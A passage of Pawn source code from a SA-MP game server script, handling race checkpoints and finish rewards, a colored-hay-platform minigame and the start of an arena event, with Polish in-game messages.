	    if(RCCheckpoint[playerid] == 2 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 3;
	        return SetPlayerRaceCheckpoint(playerid,0,-2251.7427,332.2492,34.9551,-2255.7544,-56.9760,35.1719,4); }
	    if(RCCheckpoint[playerid] == 3 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 4;
	        return SetPlayerRaceCheckpoint(playerid,0,-2255.7544,-56.9760,35.1719,-2018.9039,-70.2090,35.1719,4); }
	    if(RCCheckpoint[playerid] == 4 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 5;
	        return SetPlayerRaceCheckpoint(playerid,0,-2018.9039,-70.2090,35.1719,-2006.4771,214.4116,27.5391,4); }
	    if(RCCheckpoint[playerid] == 5 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 6;
	        return SetPlayerRaceCheckpoint(playerid,0,-2006.4771,214.4116,27.5391,-1916.5729,293.1605,41.1628,4); }
	    if(RCCheckpoint[playerid] == 6 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 7;
	        return SetPlayerRaceCheckpoint(playerid,1,-1916.5729,293.1605,41.1628,-1916.5729,293.1605,41.1628,5); }
	    if(RCCheckpoint[playerid] == 7 && RaceID == 2) {
  			new rcendtick = GetTickCount();
			new czasrc = rcendtick - rcstarttick;
	        RCCheckpoint[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        RemovePlayerFromVehicle(playerid);
	        DestroyVehicle(RCVehicle[playerid]);
	        RCPlace++;
	        new finishstr[256];
	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
			RCEnding = SetTimer("RC_End", 1000*30, 0);
	        WypiszZabawa(playerid);
	        if(RCPlayers == 0) return RC_End(); }
	    if(RCCheckpoint[playerid] == 0 && RaceID == 3) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 1;
	        return SetPlayerRaceCheckpoint(playerid,0,-2212.3862,103.9499,35.3203,-2473.6226,107.2222,35.1656,4); }
	    if(RCCheckpoint[playerid] == 1 && RaceID == 3) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 2;
	        return SetPlayerRaceCheckpoint(playerid,0,-2473.6226,107.2222,35.1656,-2660.7017,85.6645,4.1531,4); }
	    if(RCCheckpoint[playerid] == 2 && RaceID == 3) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 3;
	        return SetPlayerRaceCheckpoint(playerid,0,-2660.7017,85.6645,4.1531,-2758.8962,85.0951,6.8967,4); }
	    if(RCCheckpoint[playerid] == 3 && RaceID == 3) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 4;
	        return SetPlayerRaceCheckpoint(playerid,0,-2758.8962,85.0951,6.8967,-2790.5322,241.9180,7.1875,4); }
	    if(RCCheckpoint[playerid] == 4 && RaceID == 3) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 5;
	        return SetPlayerRaceCheckpoint(playerid,1,-2790.5322,241.9180,7.1875,-2790.5322,241.9180,7.1875,5); }
	    if(RCCheckpoint[playerid] == 5 && RaceID == 3) {
  			new rcendtick = GetTickCount();
			new czasrc = rcendtick - rcstarttick;
	        RCCheckpoint[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        RemovePlayerFromVehicle(playerid);
	        DestroyVehicle(RCVehicle[playerid]);
	        RCPlace++;
	        new finishstr[256];
	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
			RCEnding = SetTimer("RC_End", 1000*30, 0);
	        WypiszZabawa(playerid);
	        if(RCPlayers == 0) return RC_End(); }
	    if(RCCheckpoint[playerid] == 0 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 1;
	        return SetPlayerRaceCheckpoint(playerid,0,2482.1011,-1691.8477,13.5148,2484.6018,-1772.1458,13.5616,4); }
	    if(RCCheckpoint[playerid] == 1 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 2;
	        return SetPlayerRaceCheckpoint(playerid,0,2484.6018,-1772.1458,13.5616,2527.3799,-1774.1199,13.3828,4); }
	    if(RCCheckpoint[playerid] == 2 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 3;
	        return SetPlayerRaceCheckpoint(playerid,0,2527.3799,-1774.1199,13.3828,2527.6946,-1740.8508,13.3906,4); }
	    if(RCCheckpoint[playerid] == 3 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 4;
	        return SetPlayerRaceCheckpoint(playerid,0,2527.6946,-1740.8508,13.3906,2355.2878,-1732.3431,13.3828,4); }
	    if(RCCheckpoint[playerid] == 4 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 5;
	        return SetPlayerRaceCheckpoint(playerid,0,2355.2878,-1732.3431,13.3828,2342.4714,-1666.7982,13.3671,4); }
	    if(RCCheckpoint[playerid] == 5 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 6;
	        return SetPlayerRaceCheckpoint(playerid,0,2342.4714,-1666.7982,13.3671,2204.7156,-1645.4791,15.2803,4); }
	    if(RCCheckpoint[playerid] == 6 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 7;
	        return SetPlayerRaceCheckpoint(playerid,0,2204.7156,-1645.4791,15.2803,2184.3486,-1799.7246,13.3654,4); }
	    if(RCCheckpoint[playerid] == 7 && RaceID == 4) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 8;
	        return SetPlayerRaceCheckpoint(playerid,1,2184.3486,-1799.7246,13.3654,2184.3486,-1799.7246,13.3654,5); }
	    if(RCCheckpoint[playerid] == 8 && RaceID == 4) {
  			new rcendtick = GetTickCount();
			new czasrc = rcendtick - rcstarttick;
	        RCCheckpoint[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        RemovePlayerFromVehicle(playerid);
	        DestroyVehicle(RCVehicle[playerid]);
	        RCPlace++;
	        new finishstr[256];
	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
			RCEnding = SetTimer("RC_End", 1000*30, 0);
	        WypiszZabawa(playerid);
	        if(RCPlayers == 0) return RC_End(); }
          if(RCCheckpoint[playerid] == 0 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 1;
    	        return SetPlayerRaceCheckpoint(playerid,0,2270.4824,973.2679,10.3770,2287.3672,649.6857,10.3774,4); }
    	    if(RCCheckpoint[playerid] == 1 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 2;
    	        return SetPlayerRaceCheckpoint(playerid,0,2287.3672,649.6857,10.3774,2409.9553,633.2405,10.3761,4); }
    	    if(RCCheckpoint[playerid] == 2 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 3;
    	        return SetPlayerRaceCheckpoint(playerid,0,2409.9553,633.2405,10.3761,2427.4131,692.7937,10.3774,4); }
    	    if(RCCheckpoint[playerid] == 3 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 4;
    	        return SetPlayerRaceCheckpoint(playerid,0,2427.4131,692.7937,10.3774,2303.8403,713.1924,10.3763,4); }
    	    if(RCCheckpoint[playerid] == 4 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 5;
    	        return SetPlayerRaceCheckpoint(playerid,0,2303.8403,713.1924,10.3763,2287.3062,953.7750,10.3779,4); }
    	    if(RCCheckpoint[playerid] == 5 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 6;
    	        return SetPlayerRaceCheckpoint(playerid,0,2287.3062,953.7750,10.3779,2370.8301,993.4050,10.5248,4); }
    	    if(RCCheckpoint[playerid] == 6 && RaceID == 5) {
    	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
    	        RCCheckpoint[playerid] = 7;
    	        return SetPlayerRaceCheckpoint(playerid,0,2370.8301,993.4050,10.5248,2370.8301,993.4050,10.5248,5); }
    	    if(RCCheckpoint[playerid] == 7 && RaceID == 5) {
      			new rcendtick = GetTickCount();
    			new czasrc = rcendtick - rcstarttick;
    	        RCCheckpoint[playerid] = -1;
    	        DisablePlayerRaceCheckpoint(playerid);
    	        RemovePlayerFromVehicle(playerid);
    	        DestroyVehicle(RCVehicle[playerid]);
    	        RCPlace++;
    	        new finishstr[256];
    	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
    	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
    			RCEnding = SetTimer("RC_End", 1000*30, 0);
    	        WypiszZabawa(playerid);
    	        if(RCPlayers == 0) return RC_End(); }
              if(RCCheckpoint[playerid] == 0 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 1;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1944.8483,-403.3777,33.2410,-1809.6244,365.9044,29.1670,4); }
        	    if(RCCheckpoint[playerid] == 1 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 2;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1809.6244,365.9044,29.1670,-1537.6492,682.8543,35.0956,4); }
        	    if(RCCheckpoint[playerid] == 2 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 3;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1537.6492,682.8543,35.0956,-1265.3406,967.5941,34.3359,4); }
        	    if(RCCheckpoint[playerid] == 3 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 4;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1265.3406,967.5941,34.3359,-1418.5793,1742.8409,21.1072,4); }
        	    if(RCCheckpoint[playerid] == 4 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 5;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1418.5793,1742.8409,21.1072,-1622.3223,1829.5701,19.5058,4); }
        	    if(RCCheckpoint[playerid] == 5 && RaceID == 6) {
        	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
        	        RCCheckpoint[playerid] = 6;
        	        return SetPlayerRaceCheckpoint(playerid,3,-1622.3223,1829.5701,19.5058,-1638.0414,2014.7753,19.1626,4); }
              if(RCCheckpoint[playerid] == 6 && RaceID == 6) {
                  PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
                  RCCheckpoint[playerid] = 7;
                  return SetPlayerRaceCheckpoint(playerid,4,-1638.0414,2014.7753,19.1626,-1638.0414,2014.7753,19.1626,4); }
        	    if(RCCheckpoint[playerid] == 7 && RaceID == 6) {
          			new rcendtick = GetTickCount();
        			new czasrc = rcendtick - rcstarttick;
        	        RCCheckpoint[playerid] = -1;
        	        DisablePlayerRaceCheckpoint(playerid);
        	        RemovePlayerFromVehicle(playerid);
        	        DestroyVehicle(RCVehicle[playerid]);
        	        RCPlace++;
        	        new finishstr[256];
        	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
        	        SendClientMessageToAll(-1, finishstr);
					if(RCPlace == 1) AddExp(playerid, 50);
					if(RCPlace == 2) AddExp(playerid, 30);
					if(RCPlace == 3) AddExp(playerid, 20);
					if(RCPlace == 4) AddExp(playerid, 10);
					if(RCPlace == 5) AddExp(playerid, 5);
        			RCEnding = SetTimer("RC_End", 1000*30, 0);
        	        WypiszZabawa(playerid);
        	        if(RCPlayers == 0) return RC_End(); }
	}
    return 1;
}

CreateHay(Float:x, Float:y, Float:z)
{
	if(createdhays >= MAX_HAYS) return 1;
	HayObj[createdhays] = CreateDynamicObject(3374, x, y, z, 0.000000, 0.000000, 0.000000, 19, -1, -1, 50.00, 50.00);
	IsHayCreated[createdhays] = true;
	createdhays++;
	return 1;
}

forward CH_Start();
public CH_Start()
{
	if(Osoby[CH] < Min[CH])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == CH) OnGame[playerid] = -1; }
	    Startuje[CH] = false;
 	    return RefreshZabawy();
	}
	Wystartowala[CH] = true;
	Startuje[CH] = false;
	CHPlayers = 0;
	createdhays = 0;
	CHRound = 0;
	Loop(hayid, MAX_HAYS)
	{
	    if(IsHayCreated[hayid])
	    {
	        IsHayCreated[hayid] = false;
	        HayType[hayid] = 0;
	        DestroyDynamicObject(HayObj[hayid]);
	    }

	}
	CreateHay(3120.087646, 2291.129150, 8.275512);
	CreateHay(3124.076660, 2287.099609, 8.275512);
	CreateHay(3120.086669, 2283.120361, 8.275512);
	CreateHay(3116.094482, 2287.131347, 8.275512);
	CreateHay(3120.076660, 2287.131347, 8.275512);
	CreateHay(3116.095703, 2291.161132, 8.275512);
	CreateHay(3124.086914, 2291.131103, 8.275512);
	CreateHay(3124.086914, 2283.090576, 8.275512);
	CreateHay(3116.096923, 2283.090576, 8.275512);
	CreateHay(3112.105224, 2283.090576, 8.275512);
	CreateHay(3112.105224, 2291.121582, 8.275512);
	CreateHay(3120.109619, 2295.130615, 8.275512);
	CreateHay(3128.050292, 2287.119140, 8.275512);
	CreateHay(3128.050292, 2279.108154, 8.275512);
	CreateHay(3108.117919, 2279.108154, 8.275512);
	CreateHay(3112.108154, 2275.187988, 8.275512);
	CreateHay(3116.119140, 2275.187988, 8.275512);
	CreateHay(3116.119140, 2271.177734, 8.275512);
	CreateHay(3120.119140, 2271.177734, 8.275512);
	CreateHay(3124.078857, 2275.199462, 8.275512);
	CreateHay(3128.028808, 2271.209960, 8.275512);
	CreateHay(3124.056152, 2271.209960, 8.275512);
	CreateHay(3108.143554, 2271.209960, 8.275512);
	CreateHay(3108.143554, 2267.210205, 8.275512);
	CreateHay(3112.133300, 2267.210205, 8.275512);
	CreateHay(3116.122314, 2267.210205, 8.275512);
	CreateHay(3116.122314, 2263.200927, 8.275512);
	CreateHay(3120.132080, 2263.200927, 8.275512);
	CreateHay(3124.084228, 2267.202148, 8.275512);
	CreateHay(3127.985595, 2263.228515, 8.275512);
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == CH) {
	        ForceObj(playerid);
			CHPlayers++;
	        SetPlayerVirtualWorld(playerid, 19);
			ResetPlayerWeapons(playerid);
			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 100.0);
	        new infostr[256];
	        format(infostr, sizeof(infostr), ""PYTAJNIK""C_ORANGE"Strzelaj w graczy stoj¹cych na odpowiednich kolorach.");
			SendClientMessage(playerid, -1, infostr);
			switch(random(6))
			{
			    case 0: SetPlayerPos(playerid,3128.4314,2262.7908,9.4016);
			    case 1: SetPlayerPos(playerid,3116.2278,2270.7119,9.4016);
			    case 2: SetPlayerPos(playerid,3116.3850,2283.8943,9.4016);
			    case 3: SetPlayerPos(playerid,3117.7395,2291.0195,9.4016);
			    case 4: SetPlayerPos(playerid,3119.9868,2295.8999,9.4016);
			    case 5: SetPlayerPos(playerid,3128.9011,2286.9661,9.4016);
			}
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("unfreezePlayer", 2000, 0, "i", playerid);
		}
	}
	CHTimer = SetTimer("CH_Check", 2500, 1);
	CHTimer2 = SetTimer("CH_Round", 8000, 0);
	RefreshZabawy();
	return 1;
}

forward CH_Round();
public CH_Round()
{
	if(!Wystartowala[CH]) return 1;
	CanCHRandom = true;
	Loop(hayid, MAX_HAYS)
	{
	    if(IsHayCreated[hayid])
	    {
	        IsHayCreated[hayid] = false;
	        HayType[hayid] = 0;
	        DestroyDynamicObject(HayObj[hayid]);
	    }

	}
	createdhays = 0;
	CreateHay(3120.087646, 2291.129150, 8.275512);
	CreateHay(3124.076660, 2287.099609, 8.275512);
	CreateHay(3120.086669, 2283.120361, 8.275512);
	CreateHay(3116.094482, 2287.131347, 8.275512);
	CreateHay(3120.076660, 2287.131347, 8.275512);
	CreateHay(3116.095703, 2291.161132, 8.275512);
	CreateHay(3124.086914, 2291.131103, 8.275512);
	CreateHay(3124.086914, 2283.090576, 8.275512);
	CreateHay(3116.096923, 2283.090576, 8.275512);
	CreateHay(3112.105224, 2283.090576, 8.275512);
	CreateHay(3112.105224, 2291.121582, 8.275512);
	CreateHay(3120.109619, 2295.130615, 8.275512);
	CreateHay(3128.050292, 2287.119140, 8.275512);
	CreateHay(3128.050292, 2279.108154, 8.275512);
	CreateHay(3108.117919, 2279.108154, 8.275512);
	CreateHay(3112.108154, 2275.187988, 8.275512);
	CreateHay(3116.119140, 2275.187988, 8.275512);
	CreateHay(3116.119140, 2271.177734, 8.275512);
	CreateHay(3120.119140, 2271.177734, 8.275512);
	CreateHay(3124.078857, 2275.199462, 8.275512);
	CreateHay(3128.028808, 2271.209960, 8.275512);
	CreateHay(3124.056152, 2271.209960, 8.275512);
	CreateHay(3108.143554, 2271.209960, 8.275512);
	CreateHay(3108.143554, 2267.210205, 8.275512);
	CreateHay(3112.133300, 2267.210205, 8.275512);
	CreateHay(3116.122314, 2267.210205, 8.275512);
	CreateHay(3116.122314, 2263.200927, 8.275512);
	CreateHay(3120.132080, 2263.200927, 8.275512);
	CreateHay(3124.084228, 2267.202148, 8.275512);
	CreateHay(3127.985595, 2263.228515, 8.275512);
	CHRound++;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == CH)
	    {
	        new infostr[256];
	        format(infostr, sizeof(infostr), ""C_WHITE"["C_ZABAWA"ColoredHay"C_WHITE"] "C_ZABAWA"Rozpoczynanie rundy "C_WHITE"%d"C_ZABAWA".", CHRound);
			SendClientMessage(playerid, -1, infostr);
			PlayerPlaySound(playerid, 5202, 0.0, 0.0, 0.0);
	    }
	}
	ValidColour = 0;
	switch(random(5))
	{
	    case 0: CHColour = 1;
	    case 1: CHColour = 2;
	    case 2: CHColour = 3;
	    case 3: CHColour = 4;
		case 4: CHColour = 5;
	}
	Loop(hayid, MAX_HAYS)
	{
	    if(ValidColour < 4)
	    {
	        switch(random(2))
	        {
	            case 0:
	            {
	        		ValidColour++;
	        		HayType[hayid] = CHColour;
	        		if(CHColour == 1) SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFED1C24);
	        		if(CHColour == 2) SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFF45FF06);
	        		if(CHColour == 3) SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFF0066FF);
	        		if(CHColour == 4) SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFFD48EB);
	        		if(CHColour == 5) SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFFFFF00);
				}
			}
	    }
     	if(HayType[hayid] != CHColour)
      	{
      	    switch(random(5))
      	    {
	            case 0:
				{
				    HayType[hayid] = 1;
					SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFED1C24);
				}
	            case 1:
				{
				    HayType[hayid] = 2;
					SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFF45FF06);
				}
	            case 2:
				{
				    HayType[hayid] = 3;
					SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFF0066FF);
				}
	            case 3:
				{
				    HayType[hayid] = 4;
					SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFFD48EB);
				}
	            case 4:
				{
				    HayType[hayid] = 5;
					SetDynamicObjectMaterial(HayObj[hayid], 0, -1, "none", "none", 0xFFFFFF00);
				}
			}
	    }
	}
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == CH)
	    {
	        if(CHColour == 1) GameTextForPlayer(playerid, "~r~~h~CZERWONY", 4000, 3);
	        if(CHColour == 2) GameTextForPlayer(playerid, "~g~~h~ZIELONY", 4000, 3);
	        if(CHColour == 3) GameTextForPlayer(playerid, "~b~~h~NIEBIESKI", 4000, 3);
	        if(CHColour == 4) GameTextForPlayer(playerid, "~p~~h~ROZOWY", 4000, 3);
	        if(CHColour == 5) GameTextForPlayer(playerid, "~y~~h~ZOLTY", 4000, 3);
	    }
	}
	SetTimer("CH_Drop", 9000, 0);
	return 1;
}

forward CH_Drop();
public CH_Drop()
{
	if(!Wystartowala[CH]) return 1;
	CanCHRandom = false;
	Loop(playerid, MAX_PLAYERS) {
	    if(OnGame[playerid] == CH) PlayerPlaySound(playerid, 5201, 0.0, 0.0, 0.0); }
	Loop(hayid, MAX_HAYS)
	{
	    if(IsHayCreated[hayid] && HayType[hayid] != CHColour)
	    {
	        IsHayCreated[hayid] = false;
	        HayType[hayid] = 0;
	        DestroyDynamicObject(HayObj[hayid]);
	    }
	}
	CHTimer3 = SetTimer("CH_Round", 3500, 0);
	return 1;
}

forward CH_Check();
public CH_Check()
{
	if(!Wystartowala[CH]) return 1;
	new randomweapon;
	randomweapon = 0;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == CH)
	    {
	        if(randomweapon == 0 && CanCHRandom)
	        {
	            switch(random(8))
	            {
	                case 0: { }
	                case 1:
	                {
	            		randomweapon++;
	            		GivePlayerWeapon(playerid, 24, 1);
	            	}
				}
			}
	        new Float:x, Float:y, Float:z;
	        GetPlayerPos(playerid, x, y, z);
	        if(z < 6)
	        {
	            WypiszZabawa(playerid);
	        }
	    }
	}
	if(CHPlayers < 2)
	{
	    Loop(playerid, MAX_PLAYERS)
	    {
	    	if(OnGame[playerid] == CH)
 			{
 				AddExp(playerid, 50);
    			Player[playerid][Cash] += 5000;
    			new msgstr[256];
    			format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/CH"C_ZABAWA".", Player[playerid][Name], playerid);
    			SendClientMessageToAll(-1, msgstr);
                Player[playerid][Zabawyp]++;
     			if(pAch[playerid][18] < 1) {
    			    if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
						pAch[playerid][18] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			    if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
						pAch[playerid][18] = 2;
                        AddExp(playerid, 400);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
						pAch[playerid][18] = 3;
						AddExp(playerid, 600);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
			}
		}
		CH_End();
	}
	return 1;
}

forward CH_End();
public CH_End()
{
	KillTimer(CHTimer);
	KillTimer(CHTimer2);
	KillTimer(CHTimer3);
	Startuje[CH] = false;
	Osoby[CH] = 0;
	Wystartowala[CH] = false;
	CHRound = 0;
	CHPlayers = 0;
	createdhays = 0;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == CH) {
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	Loop(hayid, MAX_HAYS)
	{
	    if(IsHayCreated[hayid])
	    {
	        IsHayCreated[hayid] = false;
	        HayType[hayid] = 0;
	        DestroyDynamicObject(HayObj[hayid]);
	    }
	}
	RefreshZabawy();
}

forward RK_Start();
public RK_Start()
{
	if(Osoby[RK] < Min[RK])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == RK) OnGame[playerid] = -1; }
	    Startuje[RK] = false;
 	    return RefreshZabawy();
	}
	RKPlayers = 0;
	Wystartowala[RK] = true;
	Startuje[RK] = false;
	RKMinX = 1103.7943;
	RKMinY = -1993.2859;
	RKMaxX = 1210.0850;
	RKMaxY = -2072.2649;
	RKZone = GangZoneCreate(RKMinX, RKMinY, RKMaxX, RKMaxY);
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == RK) {
 	        RKPlayers++;
	        ForceObj(playerid);
	        SetPlayerVirtualWorld(playerid, 28);
	        switch(random(6))
	        {
	            case 0: SetPlayerPos(playerid, 1170.5916,-2036.7854,69.0078);
	            case 1: SetPlayerPos(playerid, 1115.0742,-2060.9236,74.4297);
	            case 2: SetPlayerPos(playerid, 1118.0537,-2011.1149,74.4297);
	            case 3: SetPlayerPos(playerid, 1132.4436,-2000.3246,69.0078);
	            case 4: SetPlayerPos(playerid, 1175.1572,-2067.9753,69.0078);
	            case 5: SetPlayerPos(playerid, 1175.2601,-2007.0203,69.0078);
			}
       		if(HPTimering[playerid] || ArmorTimering[playerid]) {
	    		HPTimer[playerid] = 0;
	    		ArmorTimer[playerid] = 0;
	    		HPTimering[playerid] = false;
	    		ArmorTimering[playerid] = false;
	    		Sound(playerid, 17002, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, RED, "Proces uzdrawiania siê/kupna kamizelki przerwany."); }
			GangZoneShowForPlayer(playerid, RKZone, 0xFFFFFFFF);
			GangZoneFlashForPlayer(playerid,RKZone, 0xF44242FF);
	        SetPlayerArmour(playerid, 0.0);
	        SetPlayerHealth(playerid, 100.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 22, 7999);
			RKOK[playerid] = true;
		}
	}
	RKTimer = SetTimer("RK_Check", 1000, 1);
	RefreshZabawy();
	return 1;
}

forward RK_Check();
public RK_Check()
{
	if(!Wystartowala[RK]) return 1;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == RK)
	    {
	        switch(random(4))
	        {
				case 0: SetPlayerHealth(playerid, 40.0);
				case 1: SetPlayerHealth(playerid, 20.0);
				case 2: SetPlayerHealth(playerid, 10.0);
				case 3: SetPlayerHealth(playerid, 60.0);
